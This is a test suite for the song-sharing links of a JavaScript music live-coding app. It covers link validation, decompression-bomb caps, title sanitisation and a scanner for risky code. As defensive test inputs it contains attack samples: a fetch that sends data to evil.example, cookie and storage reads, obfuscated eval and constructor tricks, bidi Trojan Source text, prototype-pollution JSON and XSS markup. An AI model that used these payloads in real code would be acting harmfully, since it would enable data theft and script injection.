/**
 * Tests for sharing a song as a link (src/share.ts): encoding and decoding,
 * strict validation of forged and damaged links, size caps (including a
 * decompression bomb), title cleaning, and the scan of risky code.
 * Runs in Node, which has CompressionStream: npm test
 */
import assert from 'node:assert';
import {
    LONG_LINK_LENGTH, MAX_CODE_LENGTH, MAX_DECODED_BYTES, MAX_ENCODED_LENGTH, MAX_TITLE_LENGTH, SHARE_TEMPO_MAX, SHARE_TEMPO_MIN,
    ShareError, canCompress, cleanTitle, decodeShareHash, encodeShareHash, inflateCapped, isShareHash, lex, revealHidden,
    scanCode, shareUrl, sitesIn, validateSong,
} from '../src/share.ts';
import { DEFAULT_CODE, EXAMPLES } from '../src/data/examples.ts';

let passed = 0;
const eq = (a, b, msg) => { assert.deepStrictEqual(a, b, msg); passed++; };
const ok = (v, msg) => { assert.ok(v, msg); passed++; };

/** Expects a ShareError with this reason. */
async function rejects(promiseOrFn, reason, msg) {
    try {
        await (typeof promiseOrFn === 'function' ? promiseOrFn() : promiseOrFn);
    } catch (err) {
        assert.ok(err instanceof ShareError, (msg || reason) + ': not a ShareError: ' + err);
        assert.strictEqual(err.reason, reason, (msg || '') + ' ' + err.message);
        // The message is for people: no stack, no JSON, no "undefined".
        assert.ok(err.message.length > 10 && !/undefined|JSON|\{|stack/i.test(err.message), err.message);
        passed++;
        return;
    }
    assert.fail((msg || reason) + ': did not throw');
}

const b64url = (bytes) => Buffer.from(bytes).toString('base64url');
const deflate = async (bytes) => new Uint8Array(await new Response(new Blob([bytes]).stream().pipeThrough(new CompressionStream('deflate-raw'))).arrayBuffer());
/** A link from raw JSON text, compressed or plain: for forged links. */
const forge = async (json, method = 'd', version = '1') => {
    const bytes = typeof json === 'string' ? new TextEncoder().encode(json) : json;
    return '#song=' + version + '.' + method + '.' + b64url(method === 'd' ? await deflate(bytes) : bytes);
};
const songJson = (fields) => JSON.stringify({ t: 'Song', c: 'sound("bd")', cps: 0.5, ...fields });

ok(canCompress(), 'Node has CompressionStream deflate-raw');

// ---------------- Round trips ----------------

for (const compress of [true, false]) {
    const song = { title: 'House beat', code: 'setCPS(0.533)\nsound("bd*4")\n', cps: 0.533 };
    const hash = await encodeShareHash(song, { compress });
    ok(hash.startsWith(compress ? '#song=1.d.' : '#song=1.p.'), hash.slice(0, 12));
    ok(/^#song=1\.[dp]\.[A-Za-z0-9_-]+$/.test(hash), 'only URL-safe characters');
    eq(await decodeShareHash(hash), song);
}

// Unicode everywhere: accents, CJK, emoji (surrogate pairs), right-to-left text
{
    const song = { title: 'F\u00FCr \u00C9lise \uD83C\uDFB9 \u591C\u60F3\u66F2 \u0645\u0631\u062D\u0628\u0627', code: '// \u65E5\u672C\u8A9E \u2713 \uD83C\uDFB5\nnote("c e g").s("superpiano") // \u00FCn\u00EFc\u00F6d\u00E9', cps: 1.25 };
    eq(await decodeShareHash(await encodeShareHash(song)), song);
    eq(await decodeShareHash(await encodeShareHash(song, { compress: false })), song);
}

// Every example round-trips, and compression makes links much shorter
for (const example of EXAMPLES) {
    const song = { title: example.title, code: example.code, cps: 0.8 };
    const hash = await encodeShareHash(song);
    const back = await decodeShareHash(hash);
    assert.strictEqual(back.code, example.code.replace(/\r\n?/g, '\n'), example.title);
    assert.strictEqual(back.title, cleanTitle(example.title), example.title);
}
passed++;
{
    const code = EXAMPLES.reduce((a, e) => (e.code.length > a.length ? e.code : a), '');
    const packed = await encodeShareHash({ title: 'x', code, cps: 1 });
    const plain = await encodeShareHash({ title: 'x', code, cps: 1 }, { compress: false });
    ok(packed.length < plain.length / 2, `compressed ${packed.length} vs plain ${plain.length}`);
    ok(packed.length < LONG_LINK_LENGTH, 'the longest example fits in a link that chat apps keep');
}

// Line ends are normalised; tempo is rounded to the editor's precision
eq((await decodeShareHash(await encodeShareHash({ title: 'a', code: 'a\r\nb\rc', cps: 0.123456 }))).code, 'a\nb\nc');
eq((await decodeShareHash(await encodeShareHash({ title: 'a', code: 'x', cps: 0.123456 }))).cps, 0.123);
eq((await decodeShareHash(await encodeShareHash({ title: '', code: 'x', cps: 1 }))).title, 'Shared song');

// The page address keeps its path and query, loses its old fragment
eq(shareUrl('https://hexplus.github.io/tidaljs/?a=1#old', '#song=1.p.e30'), 'https://hexplus.github.io/tidaljs/?a=1#song=1.p.e30');
eq(shareUrl('http://localhost:5173/', '#song=x'), 'http://localhost:5173/#song=x');

// ---------------- Not a song link ----------------

eq(await decodeShareHash(''), null);
eq(await decodeShareHash('#'), null);
eq(await decodeShareHash('#examples'), null);
eq(await decodeShareHash('#songs=1.p.e30'), null);
eq(isShareHash('#song=anything'), true);
eq(isShareHash('#Song=1'), false);

// ---------------- Damaged and forged links ----------------

await rejects(decodeShareHash('#song='), 'damaged', 'empty');
await rejects(decodeShareHash('#song=1.d.'), 'damaged', 'no data');
await rejects(decodeShareHash('#song=1.d'), 'damaged', 'no method separator');
await rejects(decodeShareHash('#song=1.x.e30'), 'damaged', 'unknown method');
await rejects(decodeShareHash('#song=1.p.e30='), 'damaged', 'padding is not base64url');
await rejects(decodeShareHash('#song=1.p.e3+v'), 'damaged', 'standard base64 characters');
await rejects(decodeShareHash('#song=1.p.e%20'), 'damaged', 'percent-encoded');
await rejects(decodeShareHash('#song=1.p.abcde'), 'damaged', 'length 4n+1');
await rejects(decodeShareHash('#song=1.p.e30 '), 'damaged', 'trailing space');
await rejects(decodeShareHash('#song=1.p.e30\n'), 'damaged', 'trailing newline');
await rejects(decodeShareHash('#song=01.p.e30'), 'damaged', 'version with a leading zero');
await rejects(decodeShareHash('#song=0.p.e30'), 'damaged', 'version 0');
await rejects(decodeShareHash('#song=-1.p.e30'), 'damaged', 'negative version');
await rejects(decodeShareHash('#song=2.p.e30'), 'newer', 'a newer version');
await rejects(decodeShareHash('#song=999.d.e30'), 'newer', 'a much newer version');
await rejects(decodeShareHash('#song=1.d.' + b64url(new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8]))), 'damaged', 'not deflate data');
{
    const full = await forge(songJson({}));
    await rejects(decodeShareHash(full.slice(0, full.length - 6)), 'damaged', 'truncated deflate');
    const raw = Buffer.from(full.slice('#song=1.d.'.length), 'base64url');
    await rejects(decodeShareHash('#song=1.d.' + b64url(Buffer.concat([raw, Buffer.from('junk after the end')]))), 'damaged', 'junk after the deflate stream');
}
await rejects(forge('not json').then(decodeShareHash), 'damaged', 'not JSON');
await rejects(forge(new Uint8Array([0x7b, 0x22, 0xff, 0xfe, 0x22, 0x7d])).then(decodeShareHash), 'damaged', 'invalid UTF-8');
await rejects(forge(new Uint8Array([0xed, 0xa0, 0x80])).then(decodeShareHash), 'damaged', 'UTF-8 encoded surrogate');
for (const json of ['null', '1', '"text"', '[]', '["Song", "sound()", 1]', 'true']) {
    await rejects(forge(json).then(decodeShareHash), 'damaged', 'not an object: ' + json);
}
await rejects(forge(songJson({ x: 1 })).then(decodeShareHash), 'damaged', 'an unknown field');
await rejects(forge(JSON.stringify({ t: 'a', c: 'x' })).then(decodeShareHash), 'damaged', 'a missing field');
await rejects(forge(JSON.stringify({ t: 'a', c: 'x', cps: 1, __proto__: null }).replace('}', ',"__proto__":{"polluted":1}}')).then(decodeShareHash), 'damaged', '__proto__ field');
await rejects(forge('{"__proto__":{"polluted":1},"c":"x","cps":1}').then(decodeShareHash), 'damaged', '__proto__ in place of a field');
eq({}.polluted, undefined, 'Object.prototype is untouched');
await rejects(forge(songJson({ t: 5 })).then(decodeShareHash), 'damaged', 'title not a string');
await rejects(forge(songJson({ t: ['a'] })).then(decodeShareHash), 'damaged', 'title an array');
await rejects(forge(songJson({ t: 'x'.repeat(201) })).then(decodeShareHash), 'damaged', 'title too long');
await rejects(forge(songJson({ c: { toString: 1 } })).then(decodeShareHash), 'damaged', 'code an object');
await rejects(forge(songJson({ c: null })).then(decodeShareHash), 'damaged', 'code null');
await rejects(forge(songJson({ c: '' })).then(decodeShareHash), 'noCode', 'empty code');
await rejects(forge(songJson({ c: ' \n\t ' })).then(decodeShareHash), 'noCode', 'blank code');
await rejects(forge(songJson({ c: 'x'.repeat(MAX_CODE_LENGTH + 1) })).then(decodeShareHash), 'codeTooLong', 'code too long');
eq((await decodeShareHash(await forge(songJson({ c: 'x'.repeat(MAX_CODE_LENGTH) })))).code.length, MAX_CODE_LENGTH, 'the longest code allowed');
for (const cps of ['"1"', 'null', '0', '-1', '0.0499', '10.001', '1e999', '-1e999', 'true', '[1]']) {
    await rejects(forge(songJson({}).replace('"cps":0.5', '"cps":' + cps)).then(decodeShareHash), 'badTempo', 'tempo ' + cps);
}
eq((await decodeShareHash(await forge(songJson({ cps: SHARE_TEMPO_MIN })))).cps, SHARE_TEMPO_MIN);
eq((await decodeShareHash(await forge(songJson({ cps: SHARE_TEMPO_MAX })))).cps, SHARE_TEMPO_MAX);

// The same checks hold for plain (uncompressed) links
await rejects(forge(songJson({ extra: true }), 'p').then(decodeShareHash), 'damaged', 'plain: unknown field');
await rejects(forge(songJson({ cps: 99 }), 'p').then(decodeShareHash), 'badTempo', 'plain: bad tempo');

// Validation on its own: only plain objects
assert.throws(() => validateSong(Object.create({ t: 'a', c: 'x', cps: 1 })), ShareError); passed++;
assert.throws(() => validateSong(new (class { t = 'a'; c = 'x'; cps = 1; })()), ShareError); passed++;

// ---------------- Size caps ----------------

// Too long to read at all: rejected before any decoding
await rejects(decodeShareHash('#song=1.d.' + 'A'.repeat(MAX_ENCODED_LENGTH + 1)), 'tooLong', 'link too long');
await rejects(decodeShareHash('#song=1.p.' + 'A'.repeat(MAX_ENCODED_LENGTH * 20)), 'tooLong', 'huge link');

// A decompression bomb: 16 MB of one character deflates to a few kilobytes
{
    const huge = new TextEncoder().encode('{"t":"bomb","c":"' + 'a'.repeat(16 * 1024 * 1024) + '","cps":1}');
    const bomb = await forge(huge);
    ok(bomb.length < MAX_ENCODED_LENGTH, `the bomb fits under the link cap (${bomb.length} characters)`);
    const started = performance.now();
    await rejects(decodeShareHash(bomb), 'tooBig', 'decompression bomb');
    const ms = performance.now() - started;
    ok(ms < 2000, `the bomb is stopped early (${ms.toFixed(0)} ms)`);
    // inflateCapped stops close to the cap, not after inflating everything
    await rejects(inflateCapped(await deflate(new Uint8Array(50 * 1024 * 1024)), 1000), 'tooBig', '50 MB of zeros, 1 kB cap');
}
// Just under the decoded cap still opens
{
    const fill = MAX_DECODED_BYTES - songJson({ c: '' }).length - 10;
    ok(fill < MAX_CODE_LENGTH * 6, 'cap leaves room');
    const json = songJson({ c: '\u00E9'.repeat(Math.min(MAX_CODE_LENGTH, Math.floor(fill / 2))) });
    ok(new TextEncoder().encode(json).length <= MAX_DECODED_BYTES);
    ok((await decodeShareHash(await forge(json))).code.startsWith('\u00E9'));
}
// Over the decoded cap with code under the length limit (control characters take 6 bytes in JSON)
await rejects(forge(songJson({ c: '\u0001'.repeat(MAX_CODE_LENGTH) })).then(decodeShareHash), 'tooBig', 'decoded JSON over the cap');

// Encoding refuses what decoding would refuse, with a clear message
await rejects(encodeShareHash({ title: 'a', code: '', cps: 1 }), 'noCode');
await rejects(encodeShareHash({ title: 'a', code: '   \n', cps: 1 }), 'noCode');
await rejects(encodeShareHash({ title: 'a', code: 'x'.repeat(MAX_CODE_LENGTH + 1), cps: 1 }), 'codeTooLong');
await rejects(encodeShareHash({ title: 'a', code: '\u0001'.repeat(MAX_CODE_LENGTH), cps: 1 }), 'codeTooLong', 'JSON too large');
await rejects(encodeShareHash({ title: 'a', code: 'x', cps: NaN }), 'badTempo');
await rejects(encodeShareHash({ title: 'a', code: 'x', cps: 0 }), 'badTempo');
await rejects(encodeShareHash({ title: 'a', code: 'x', cps: 11 }), 'badTempo');
{
    // Random text barely compresses: either it fits and decodes, or it is refused as too long
    let seed = 7;
    const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    for (const [len, range] of [[30000, 0x7e], [30000, 0x2000], [15000, 0xd000]]) {
        const code = Array.from({ length: len }, () => String.fromCharCode(0x20 + Math.floor(rnd() * range))).join('').replace(/[\uD800-\uDFFF]/g, 'x');
        try {
            const hash = await encodeShareHash({ title: 't', code, cps: 1 });
            ok(hash.length <= MAX_ENCODED_LENGTH + 20);
            eq((await decodeShareHash(hash)).code, code.replace(/\r\n?/g, '\n'));
        } catch (err) {
            ok(err instanceof ShareError && err.reason === 'tooLong', String(err));
        }
    }
}

// ---------------- Titles ----------------

eq(cleanTitle('  My   beat\n\tsecond line '), 'My beat second line');
eq(cleanTitle('evil\u202Egnp.js'), 'evilgnp.js', 'right-to-left override');
eq(cleanTitle('a\u2066b\u2067c\u2068d\u2069e\u202Af\u202Bg\u202Ch\u202Di\u200Ej\u200Fk\u061Cl'), 'abcdefghijkl', 'every bidi control');
eq(cleanTitle('in\u200Bvis\u200Cible\u200D\uFEFF\u2060\u00AD'), 'invisible', 'zero-width characters');
eq(cleanTitle('a\u0000b\u0007c\u001Bd\u007Fe\u009Bf'), 'abcdef', 'control characters, ESC and CSI');
eq(cleanTitle('tag\uDB40\uDC41\uDB40\uDC42s'), 'tags', 'tag characters');
eq(cleanTitle('lone \uD800 surrogate \uDC00'), 'lone surrogate');
eq(cleanTitle('line\u2028para\u2029end'), 'line para end');
eq(cleanTitle('\u202E\u200B \u3164 '), '', 'nothing visible');
eq(cleanTitle('e\u0301'), '\u00E9', 'NFC');
eq(cleanTitle('z' + '\u0336'.repeat(50)), 'z' + '\u0336'.repeat(4), 'combining mark flood');
eq(cleanTitle('\u0645\u0631\u062D\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645'), '\u0645\u0631\u062D\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645', 'right-to-left text itself is kept');
eq(cleanTitle('<img src=x onerror=alert(1)>'), '<img src=x onerror=alert(1)>', 'markup is kept as text (it is never parsed)');
eq(Array.from(cleanTitle('\uD83C\uDFB5'.repeat(200))).length, MAX_TITLE_LENGTH, 'cut by characters');
ok(cleanTitle('\uD83C\uDFB5'.repeat(200)).isWellFormed(), 'no half emoji');
eq(cleanTitle('x'.repeat(100)).length, MAX_TITLE_LENGTH);
{
    const back = await decodeShareHash(await forge(songJson({ t: '\u202Eevil\u0000\n<b>title</b>' })));
    eq(back.title, 'evil <b>title</b>', 'a forged title is cleaned on the way in');
    const blank = await decodeShareHash(await forge(songJson({ t: '\u200B\u202E' })));
    eq(blank.title, 'Shared song');
}

// ---------------- The code scan ----------------

const risks = (code) => scanCode(code).risks.map((r) => r.title);
const has = (code, title, msg) => ok(risks(code).includes(title), (msg || code) + ' -> ' + JSON.stringify(risks(code)));
const clean = (code, msg) => eq(risks(code), [], msg || code);

// Music code is clean: every example, the default code, and comments with everyday words
for (const example of [...EXAMPLES, { title: 'default', code: DEFAULT_CODE }]) {
    eq(scanCode(example.code).risks, [], example.title);
}
clean('// a window of 4 cycles, the open hi-hat on top of the beat, the location of the snare\nsound("bd sn")');
clean('// Function to build the bass: the document of the song\nconst bass = (n) => note(n).s("supersaw")\nbass("c2 e2")');
clean('const chords = { c: "c\'maj", f: "f\'maj" }\nnote("<" + ["c", "f"].map((c) => chords[c]).join(" ") + ">")');
clean('const [a, b] = "c e".split(" ")\nnote([a, b, a].join(" "))');
clean('stack([sound("bd*2"), sound("[~ sn]*2"), note("c\'maj e\'min").s("superpiano")]).slow(1/2)');
clean('samples("github:tidalcycles/dirt-samples")\nsound("bd:3 [sn cp]")');

// Network, storage, the page, running code, leaving the page
has('fetch("https://evil.example/?d=" + data)', 'Network access');
has('new XMLHttpRequest()', 'Network access');
has('new WebSocket("wss://x")', 'Network access');
has('navigator.sendBeacon("/x", d)', 'Network access');
has('new RTCPeerConnection()', 'Network access');
has('localStorage.getItem("tidaljs:code")', 'Your saved data');
has('indexedDB.open("tidaljs")', 'Your saved data');
has('document.cookie', 'Your saved data');
has('document.body.textContent = ""', 'The page itself');
has('window.x = 1', 'The page itself');
has('const w = window\nw.fetch', 'The page itself', 'window on its own line');
has('self.fetch', 'The page itself');
has('top.location.href', 'The page itself');
has('const g = self', 'The page itself');
has('globalThis', 'Reaches inside JavaScript');
has('eval("1 + 1")', 'Runs extra code');
has('Function("return this")()', 'Runs extra code');
has('new Function("a", "b")', 'Runs extra code');
has('import("data:text/javascript,1")', 'Runs extra code');
has('setTimeout("alert(1)", 10)', 'Runs extra code');
has('sound.constructor.constructor("code")()', 'Reaches inside JavaScript');
has('Object.getPrototypeOf(sound)', 'Reaches inside JavaScript');
has('x.__proto__', 'Reaches inside JavaScript');
has('location = "https://phish.example"', 'Leaves or changes the page');
has('location.assign(u)', 'Leaves or changes the page');
has('open("https://x.example")', 'Leaves or changes the page');
has('history.pushState({}, "", "/")', 'Leaves or changes the page');
has('postMessage("x", "*")', 'Other browser features');
has('new Worker(u)', 'Other browser features');
has('prompt("Your password")', 'Pop-up messages');
has('alert (1)', 'Pop-up messages');
has('new Image().src = u', 'Loads images or media');

// Ways to hide names
has('self["fe" + "tch"]("//evil.example")', 'Builds names from pieces');
has('self["fe" + "tch"]("//evil.example")', 'Looks up names from text');
has('x[a + b]', 'Looks up names from text');
has('sound[k][k]("code")()', 'Looks up names from text');
has('sound[k]("x")', 'Looks up names from text');
has('x?.["y"]', 'Looks up names from text');
has('"abcdefghijklmnopqrstuvwxyz"[5]', 'Looks up names from text');
has('const k = ["con", "str", "uctor"].join("")', 'Builds names from pieces');
has('const k = ["con", "str", "uctor"].join``', 'Builds names from pieces');
has('const a = "constr"; const b = "uctor"', 'Builds names from pieces', 'pieces of a sensitive name');
has('"fe".concat("tch")', 'Builds names from pieces');
has('`${"fe"}${"tch"}`', 'Builds names from pieces');
has('String.fromCharCode(102, 101, 116)', 'Builds names from pieces');
has('atob("ZmV0Y2g=")', 'Builds names from pieces');
has('(1517).toString(36)', 'Builds names from pieces');
has('String.raw`x`', 'Builds names from pieces');
has('decodeURIComponent("%66etch")', 'Builds names from pieces');
has('"\\u0066etch"', 'Escaped characters');
has('\\u{66}etch()', 'Escaped characters');
has('"\\x66etch"', 'Escaped characters');
has('"fe\\\ntch"', 'Escaped characters', 'a line continuation inside a string');

// Code made to look different from what runs (Trojan Source), or out of sight
has('const isAdmin = false; /*\u202E } \u2066if (isAdmin)\u2069 \u2066 begin admins only */', 'Invisible characters');
has('sound("bd")\u200B', 'Invisible characters');
has('sound("bd")\n' + '\n'.repeat(60) + 'fetch(u)', 'Code far below empty lines');
has('sound("bd")' + ' '.repeat(500) + '; x()', 'Very long lines');
{
    const bidi = scanCode('a\u202Eb').risks.find((r) => r.title === 'Invisible characters');
    eq(bidi.words, ['U+202E']);
    ok(/reorder/.test(bidi.why));
}

// Where the lexer could be fooled, the scan says so
has('if (x) /"/.test(y); evil(); ("/")', 'Code this check cannot read for sure', 'slash after )');
has('a++ / 2', 'Code this check cannot read for sure', 'slash after ++');
has('"unfinished\nfetch', 'Code this check cannot read for sure');
has('/* never closed', 'Code this check cannot read for sure');
clean('sound("bd").fast(2 / 3).gain(1/2)');
clean('const re = /[/"]+/g\nnote("c")', 'a regular expression with quotes in it');

// Lines and words are reported, a few at most
{
    const scan = scanCode('sound("bd")\nfetch(a)\nfetch(b)\nlocalStorage.x\n' + 'fetch()\n'.repeat(20));
    const net = scan.risks.find((r) => r.title === 'Network access');
    eq(net.words, ['fetch']);
    eq(net.lines.slice(0, 2), [2, 3]);
    ok(net.lines.length <= 5);
    ok(scan.risks.find((r) => r.title === 'Your saved data').lines[0] === 4);
}

// The lexer blanks strings and comments but keeps positions
{
    const src = 'a("x[y]") // z[w]\nb(`t${c["k"]}u`)';
    const lexed = lex(src);
    eq(lexed.code.length, src.length);
    eq(lexed.code.split('\n').length, 2);
    ok(!lexed.code.includes('x[y]') && !lexed.code.includes('z[w]') && lexed.code.includes('c[" "]'));
    eq(lexed.strings.map((s) => s.text), ['x[y]', 'k']);
}

// Sites the code names
eq(sitesIn('samples("https://raw.githubusercontent.com/a/b/main/strudel.json")\nsetOscUrl("ws://localhost:8080")'), ['raw.githubusercontent.com', 'localhost']);
eq(sitesIn('samples("github:tidalcycles/dirt-samples")'), ['raw.githubusercontent.com']);
eq(sitesIn('fetch("//evil.example/x")'), ['evil.example']);
eq(sitesIn('sound("bd")'), []);

// The preview shows hidden characters instead of obeying them
eq(revealHidden('a\u202Eb\u200Bc\td'), 'a⟦U+202E⟧b⟦U+200B⟧c\td');

// Shared code reaches the editor, which highlights it with innerHTML: no markup of its own may come through
{
    const { highlightHtml, marksHtml } = await import('../src/editor/language.ts');
    const hostile = '// </code><img src=x onerror=alert(1)>\nsound("<script>alert(1)</script>" + `"\'${x}`)\n<!-- --> &amp; <svg/onload=alert(1)>';
    const problems = { errors: [{ start: 0, end: 12 }], warnings: [{ start: 20, end: 40 }] };
    for (const html of [highlightHtml(hostile), marksHtml(hostile, problems)]) {
        const tags = html.match(/<[^>]*>/g) || [];
        ok(tags.every((t) => /^<span class="(?:tok|mk)-[a-z]+">$|^<\/span>$/.test(t)), 'only our own spans: ' + tags.join(' '));
        ok(!/["']/.test(html.replace(/<span class="[a-z-]+">/g, '')), 'quotes are escaped too');
    }
}

console.log(`share: all ${passed} checks passed`);
